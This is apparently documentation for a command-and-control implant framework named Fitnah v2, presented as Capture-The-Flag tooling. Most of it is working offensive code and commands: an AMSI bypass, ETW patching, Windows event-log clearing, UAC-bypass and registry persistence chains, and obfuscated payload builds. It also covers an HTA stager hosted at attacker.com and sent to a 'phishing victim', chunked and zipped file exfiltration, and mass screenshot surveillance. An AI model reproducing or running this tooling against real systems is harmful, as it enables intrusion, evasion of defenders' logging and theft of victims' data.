# Fitnah v2 — Advanced CTF Features

This guide covers specialized techniques for Capture-The-Flag competitions: automated exploitation, fast extraction, and coordinated multi-stage attacks.

## Flag Submission Automation

### Flag Submission Plugin

Automatically submit captured flags to CTF scoreboard:

```python
from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.result import ModuleResult
from fitnah.sdk.param import Param
import requests

class FlagSubmitPlugin(BasePlugin):
    NAME = "flag_submit"
    CATEGORY = "collection"
    DESCRIPTION = "Submit flag to CTF scoreboard"
    AUTHOR = "@ctf-team"
    VERSION = "1.0"
    
    PARAMS = [
        Param("flag", "str", required=True, help="Flag to submit"),
        Param("scoreboard_url", "str", required=True, help="CTF API endpoint"),
        Param("team_token", "str", required=True, help="Team authentication token"),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        flag = params["flag"]
        url = params["scoreboard_url"]
        token = params["team_token"]
        
        try:
            resp = requests.post(
                url,
                json={"flag": flag},
                headers={"Authorization": f"Bearer {token}"},
                timeout=10
            )
            
            if resp.status_code == 200:
                data = resp.json()
                points = data.get("points", 0)
                return ModuleResult.ok(f"✓ Flag accepted! +{points} points")
            elif resp.status_code == 400:
                return ModuleResult.info("Flag already submitted or invalid")
            else:
                return ModuleResult.err(f"Server error: {resp.status_code}")
        except Exception as exc:
            return ModuleResult.err(f"Submission failed: {exc}")
```

### Automated Flag Capture & Submission Workflow

1. **Recon Phase** — Enumerate system, find flag location
2. **Exploitation Phase** — Escalate privileges, access flag file
3. **Collection Phase** — Extract flag from target
4. **Submission Phase** — Submit to scoreboard

Use scheduled tasks to automate:

```bash
fitnah> schedule --add
  Task: ctf-flag-hunt
  Agent: target-01
  Plugin: file_search
  Params: {"pattern": "flag*.txt", "path": "C:\\"}
  Interval: 10s        # check every 10 seconds

# When file_search finds flag:
fitnah> schedule --add
  Task: ctf-submit
  Agent: target-01
  Plugin: flag_submit
  Params: {"scoreboard_url": "http://ctf.local:5000/submit", "team_token": "xyz"}
  Trigger: on_previous_success  # auto-run after file_search succeeds
```

---

## Scheduler for Automated Tasks

### Recurring Plugin Execution

Run the same plugin repeatedly on interval:

```bash
fitnah> schedule --add
  Name: monitor-system
  Agent: target-01
  Plugin: sysinfo
  Interval: 30s
  Max runs: 0           # infinite
  Start time: now

# View scheduled tasks
fitnah> schedule --list
  ID  Name              Interval  Status    Next run
  1   monitor-system    30s       running   +25s
```

### Conditional Scheduling (Chain Tasks)

Run Task B only if Task A succeeds:

```bash
fitnah> schedule --add
  Name: escalate
  Agent: target-01
  Plugin: uac_bypass
  
fitnah> schedule --add
  Name: persist-after-escalate
  Agent: target-01
  Plugin: registry_run
  DependsOn: escalate      # only run if escalate succeeded
  OnlyIf: status == "ok"
```

### Batch Schedule (All Agents)

Run plugin across all active agents on a timer:

```bash
fitnah> schedule --batch
  Plugin: screenshot
  Interval: 60s
  Targets: all            # applies to all current + future agents
```

---

## Multi-Stage Exploitation

### Initial Access (HTTP Listener)

1. **Deploy stager** — send small payload (PS1, HTA, VBA)
   ```bash
   fitnah> builder --format hta --output payload.hta
   # Host on web server: http://attacker.com/payload.hta
   ```

2. **Execute stager** (phishing, drive-by download)
   - Victim runs `payload.hta`
   - HTA executes PowerShell one-liner

3. **Beacon to C2** — stager calls back to HTTP listener
   ```
   POST http://c2.local:8888/checkin
   X-Agent-Key: fitnah-secret
   Body: [encrypted checkin]
   ```

### Execution & Privilege Escalation

```
Stage 1: Stager beacons
  ↓ (dispatch UAC bypass)
Stage 2: Escalate to admin
  ↓ (dispatch persistence module)
Stage 3: Establish persistence
  ↓ (dispatch final payload)
Stage 4: Full control
```

```bash
fitnah> schedule --add --multi-stage
  Stage 1: Beacon (plugin: ping)
  Stage 2: Escalate (plugin: uac_bypass, trigger: on_previous_ok)
  Stage 3: Persist (plugin: registry_run, trigger: on_stage_2_ok)
  Stage 4: Cleanup (plugin: clear_logs, trigger: on_stage_3_ok)
```

### Parallel Exploitation

Exploit multiple targets simultaneously:

```bash
fitnah> batch --plugin sysinfo --agents target-01,target-02,target-03 --parallel
[*] Executing sysinfo in parallel on 3 agents...
[✓] target-01  completed in 1.2s
[✓] target-02  completed in 1.5s
[✓] target-03  completed 1.8s
Avg time: 1.5s (3x faster than serial)
```

---

## Evasion in CTF

### AMSI Bypass

PowerShell's Antimalware Scan Interface patches:

```python
class AMSIBypassPlugin(BasePlugin):
    NAME = "amsi_bypass"
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        ps_code = """
        # AMSI bypass (PowerShell 3.0+)
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        
        # Alternative: assembly reflection
        $w = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext', 'NonPublic,Static')
        $w.SetValue($null, $null)
        
        Write-Host "AMSI patched"
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok("AMSI disabled") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

### ETW Patching

Event Tracing for Windows evasion:

```python
class ETWBypassPlugin(BasePlugin):
    NAME = "etw_patch"
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        ps_code = """
        # ETW patch via reflection
        $asm = [Reflection.Assembly]::LoadWithPartialName('System.Core')
        $EventProvider = $asm.GetType('System.Diagnostics.Eventing.EventProvider')
        $method = $EventProvider.GetMethod('WriteEvent', [Reflection.BindingFlags]'NonPublic,Instance')
        
        # Disable ETW logging
        function Invoke-ETWPatch {
            [void] $method.Invoke($EventProvider, @($null))
        }
        
        Invoke-ETWPatch
        Write-Host "ETW disabled"
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok("ETW patched") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

### Obfuscation Levels

Build payloads with variable obfuscation:

```bash
# No obfuscation (fastest, most detectable)
fitnah> builder --format exe --obfuscate none

# Light obfuscation (base64 stager)
fitnah> builder --format exe --obfuscate light

# Heavy obfuscation (reflection, string encoding)
fitnah> builder --format exe --obfuscate heavy

# Maximum obfuscation (XOR + LZMA + jitter)
fitnah> builder --format exe --obfuscate max --encrypt aes-256-gcm
```

---

## Speed Optimization

### Parallel Plugin Execution

Execute plugins across agents concurrently:

```bash
fitnah> batch --plugin screenshot --agents "*" --parallel --timeout 10
[*] 15 agents screenshotting in parallel...
[✓] completed in 3.2 seconds (would take 45s serially)
```

### Batch Command Execution

Queue multiple commands; implant processes in order:

```bash
fitnah> batch --script /path/to/commands.txt --target target-01
# commands.txt:
# sysinfo
# shell whoami
# screenshot
# powershell Get-ADUser -Filter *
# shell ipconfig /all
```

Implant executes all commands without waiting for UI between each.

### Connection Pooling

Reuse HTTP connections to C2 (faster checkins):

```yaml
http:
  enabled: true
  host: "0.0.0.0"
  port: 8888
  pool_size: 100        # max concurrent connections
  keep_alive_timeout: 30  # seconds
```

---

## Cleanup & Evidence Removal

### Clear Windows Logs

```python
class ClearLogsPlugin(BasePlugin):
    NAME = "clear_logs"
    CATEGORY = "defense_evasion"
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        ps_code = """
        # Disable logging
        Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
        
        # Clear event logs
        $logs = @(
            'Security',
            'System',
            'Application',
            'Windows PowerShell',
            'Microsoft-Windows-PowerShell/Operational'
        )
        
        foreach ($log in $logs) {
            try {
                Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
                Write-Host "Cleared $log"
            } catch {
                Write-Host "Failed to clear $log"
            }
        }
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok("Logs cleared") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

### Remove Persistence

Clean up after exploitation:

```bash
fitnah> use registry_run target-01 --remove-key "HKCU\Software\Microsoft\Windows\Run\Fitnah"
[✓] Registry key removed
```

### Shutdown Gracefully

```bash
fitnah> shutdown target-01
[*] Sending die command to target-01...
[✓] Agent exited cleanly
```

---

## CTF-Specific Plugins

### Port Scan (Network Recon)

```python
class PortScanPlugin(BasePlugin):
    NAME = "port_scan"
    CATEGORY = "recon"
    MITRE = "T1046"
    
    PARAMS = [
        Param("target", "str", required=True),
        Param("ports", "str", required=False, default="22,80,443,3389,5985"),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        # Scan target's open ports
        # Return formatted results for flag hunting
        pass
```

### Domain Enumeration

```python
class DomainEnumPlugin(BasePlugin):
    NAME = "domain_enum"
    CATEGORY = "recon"
    MITRE = "T1018"
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        ps_code = """
        Get-ADComputer -Filter * | Select-Object Name, OperatingSystem, IPv4Address | ConvertTo-Json
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok(result.stdout)
```

### Flag Hunter (Automated File Search)

```python
class FlagHunterPlugin(BasePlugin):
    NAME = "flag_hunter"
    CATEGORY = "collection"
    
    PARAMS = [
        Param("pattern", "str", required=False, default="flag*"),
        Param("depth", "int", required=False, default=3),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        pattern = params.get("pattern")
        depth = params.get("depth", 3)
        
        # Recursively search for flags
        ps_code = f"""
        Get-ChildItem -Path 'C:\\' -Filter '{pattern}' -Recurse -Depth {depth} | Select-Object FullName | ConvertTo-Json
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok(result.stdout)
```

---

## Time Management

### Max Runtime Control

Limit total exploitation time:

```bash
fitnah> run --max-runtime 3600  # stop after 1 hour
[*] Timer started: 1 hour remaining

# Remaining time available
fitnah> status --show-timer
Elapsed: 45min 32sec
Remaining: 14min 28sec
```

### Fast Extraction

Optimize for speed:

```bash
fitnah> batch --plugin screenshot --agents "*" \
  --interval 5s \
  --timeout 5s \
  --max-runs 100

# Capture 100 screenshots every 5 seconds across all agents
# Total time: ~5 minutes for comprehensive visual surveillance
```

---

## Reliable Exfiltration

### Chunked Upload (Large Files)

Split large files into chunks to bypass size limits:

```python
class ChunkedSendPlugin(BasePlugin):
    NAME = "chunked_send"
    CATEGORY = "exfiltration"
    
    PARAMS = [
        Param("file_path", "str", required=True),
        Param("chunk_size", "int", required=False, default=1024*1024),  # 1 MB
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        file_path = params["file_path"]
        chunk_size = params.get("chunk_size", 1024*1024)
        
        # Read file, chunk it, send each chunk separately
        with open(file_path, 'rb') as f:
            chunk_num = 0
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                
                import base64
                b64 = base64.b64encode(chunk).decode()
                
                result = ctx.send(
                    agent_id=session.agent_id,
                    command="upload_chunk",
                    args={"chunk_num": chunk_num, "data": b64}
                )
                
                chunk_num += 1
        
        return ModuleResult.ok(f"Sent {chunk_num} chunks")
```

### ZIP & Exfil

Compress files before exfiltration:

```python
class ZipExfilPlugin(BasePlugin):
    NAME = "zip_exfil"
    CATEGORY = "exfiltration"
    
    PARAMS = [
        Param("source_dir", "str", required=True),
        Param("output_file", "str", required=False, default="C:\\Windows\\Temp\\archive.zip"),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        src = params["source_dir"]
        out = params.get("output_file")
        
        ps_code = f"""
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory('{src}', '{out}')
        Write-Host '{out}'
        """
        result = ctx.ps(ps_code.split('\n'))
        
        if result.returncode == 0:
            # Now download the ZIP
            return ModuleResult.ok(f"Archive created: {out}")
        else:
            return ModuleResult.err(f"Compression failed: {result.stderr}")
```

---

## Scoring & Metrics

### Audit Trail for Scoring

Every action is logged to `data/audit.log`:

```bash
tail -f data/audit.log | grep "flag_submit"
2024-01-15 14:23:10  [plugin_run]  target-01  flag_submit  ok
2024-01-15 14:24:15  [plugin_run]  target-02  flag_submit  ok
2024-01-15 14:25:30  [plugin_run]  target-03  flag_submit  error
```

Export audit for CTF scoring:

```bash
fitnah> audit --export --format json > ctf_results.json
```

---

## Competition Workflow

### Pre-Competition Setup

```bash
# 1. Build payloads for all target architectures
fitnah> builder --batch

# 2. Install CTF-specific plugins
fitnah> plugin --install flag_submit.py
fitnah> plugin --install port_scan.py
fitnah> plugin --install flag_hunter.py

# 3. Test connectivity
curl http://c2.local:8888/health

# 4. Start C2 server
python fitnah.py &

# 5. Load flags config
export CTF_SCOREBOARD_URL="http://ctf.local/submit"
export CTF_TEAM_TOKEN="xyz123"
```

### During Competition

```bash
# 1. Deploy initial payload
fitnah> builder --format hta --output /var/www/html/payload.hta
# Send link to phishing victim or network delivery

# 2. Wait for beacons
fitnah> sessions --watch  # auto-refresh every 5s

# 3. Recon & exploitation
fitnah> batch --plugin sysinfo --agents "*"
fitnah> batch --plugin domain_enum --agents target-01

# 4. Hunt for flags
fitnah> batch --plugin flag_hunter --agents "*" --pattern "flag*.txt"

# 5. Submit automatically
fitnah> schedule --add
  Plugin: flag_submit
  Trigger: on_file_found

# 6. Monitor progress
fitnah> audit --export --live  # stream results to CTF dashboard
```

---

## Post-Competition

### Evidence Collection

```bash
fitnah> loot --export --format json
# Contains all screenshots, credentials, files
```

### Session Cleanup

```bash
fitnah> sessions --kill-all
# Gracefully shut down all implants

fitnah> sessions --remove-all
# Clear session database
```

---

## Next Steps

- **Plugin Development**: See `README_PLUGINS.md` to create custom modules
- **Operations**: See `README_USAGE.md` for CLI commands
- **Hostile Environments**: See `README_HOSTILE.md` for evasion
